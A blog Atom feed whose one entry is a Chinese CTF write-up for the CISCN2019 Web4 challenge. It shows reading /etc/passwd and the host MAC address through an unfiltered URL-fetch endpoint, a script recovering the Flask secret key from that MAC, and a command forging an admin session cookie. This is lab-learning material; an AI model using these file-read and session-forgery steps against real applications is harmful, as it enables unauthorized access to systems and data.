@@ -1,0 +1,145 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;flask的session伪造&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-08-23T13:06:15.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <entry>
+        <id>http://odiws.github.io/2024/08/23/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/</id>
+        <title>[CISCN2019华东南赛区]Web4</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/23/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/"/>
+        <content type="html">&lt;h2 id=&#34;ciscn2019华东南赛区web4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019华东南赛区web4&#34;&gt;#&lt;/a&gt; [CISCN2019 华东南赛区] Web4&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;打开有一个链接，那先点击一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现 url 处，很像命令执行，试一试。发现无论是什么都是 no response，又是各种尝试&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现直接传？url=/etc/passwwd 可以爆出回显，难道不是命令执行，是代码执行&lt;/p&gt;
+&lt;p&gt;先尝试一下目录穿越，发现 flag 被禁了&lt;img data-src=&#34;../images/%5BCISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;又是一波各种尝试，最后发现 app/appp.py 处可以获得源码。&lt;/p&gt;
+&lt;p&gt;这里记一点：&lt;strong&gt;url/read?id=xxxx 这种在 url 和参数中间又会有一段字符串的，可以考虑是写了路由，不是 php 后端，可能是 python 后端&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;这点非常重要，帮助我们判断后端语言进行下一步，源码的读取等多种操作&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;其实这里猜想了可能是 flask，因为抓包看到了 session，格式很像 flask 的格式&lt;/p&gt;
+&lt;p&gt;*&lt;strong&gt;1*&lt;/strong&gt;|***1***&lt;strong&gt; 代码审计&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# encoding:utf-8
+import re, random, uuid, urllib
+from flask import Flask, session, request
+
+app = Flask(__name__)
+random.seed(uuid.getnode())
+app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)
+app.debug = True
+
+@app.route(&#39;/&#39;)
+def index():
+    session[&#39;username&#39;] = &#39;www-data&#39;
+    return &#39;Hello World! &amp;lt;a href=&amp;quot;/read?url=https://baidu.com&amp;quot;&amp;gt;Read somethings&amp;lt;/a&amp;gt;&#39;
+
+@app.route(&#39;/read&#39;)
+def read():
+    try:
+        url = request.args.get(&#39;url&#39;)
+        m = re.findall(&#39;^file.*&#39;, url, re.IGNORECASE)
+        n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)
+        if m or n:
+            return &#39;No Hack&#39;
+        res = urllib.urlopen(url)
+        return res.read()
+    except Exception as ex:
+        print str(ex)
+    return &#39;no response&#39;
+
+@app.route(&#39;/flag&#39;)
+def flag():
+    if session and session[&#39;username&#39;] == &#39;fuck&#39;:
+        return open(&#39;/flag.txt&#39;).read()
+    else:
+        return &#39;Access denied&#39;
+
+if __name__==&#39;__main__&#39;:
+    app.run(
+        debug=True,
+        host=&amp;quot;0.0.0.0&amp;quot;
+    )
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;flag 路由意思是只要伪造了 session 登陆即可获得 flag 内容，那么我们伪造 session，首先要获取密钥，在代码中也有，我们先看看 uuid.getnode () 有什么用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;意思就是获取 mac 地址&lt;/p&gt;
+&lt;p&gt;linux 下 mac 地址的位置：&lt;strong&gt;/sys/class/net/eth0/address&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;读取获得 mac 地址&lt;/p&gt;
+&lt;p&gt;然后他采取的是伪随机数的方式，我们按他的同样使用，编写 exp&lt;/p&gt;
+&lt;p&gt;*&lt;strong&gt;1*&lt;/strong&gt;|***2***&lt;strong&gt;exp&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import random
+
+mac=&amp;quot;02:42:ae:00:4b:75 &amp;quot;
+nmac=mac.replace(&amp;quot;:&amp;quot;, &amp;quot;&amp;quot;)
+random.seed(int(nmac,16))
+key = str(random.random() * 233)
+print(key)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里又是几个坑点，一定要用 python2 环境执行，因为靶机使用的是 python2 环境，其会对后面的小数自动约分，所以需要使用 python2 执行的数字&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后我使用过几次 flask-session-cookie-manager-master 发现，解密与加密需要使用固定的格式不然会报错，以此为例：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解密出来的字符串不能直接更改值，需要改为键值的格式&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;quot;&amp;#123;&#39;username&#39;:&#39;fuck&#39;&amp;#125;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload: &lt;code&gt;python flask_session_cookie_manager3.py encode -s 63.5983416128 -t &amp;quot;&amp;#123;&#39;username&#39;:&#39;fuck&#39;&amp;#125;&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用此 session 在 flag 路由下访问即可获得 flag&lt;/p&gt;
+&lt;p&gt;总结思路&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现 url 格式采用了路由的访问形式确认是 python 后端&lt;/li&gt;
+&lt;li&gt;查看 session 很像 flask，基本确定是 flask 框架&lt;/li&gt;
+&lt;li&gt;通过工具解密 session 伪造 session 登陆&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;知识点&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;flask&lt;/li&gt;
+&lt;li&gt;伪造 session&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2Fyc2EvcC8xMzUyOTc2OS5odG1s&#34;&gt;https://www.cnblogs.com/karsa/p/13529769.html&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="flask的session伪造" />
+        <updated>2024-08-23T13:06:15.000Z</updated>
+    </entry>
+</feed>
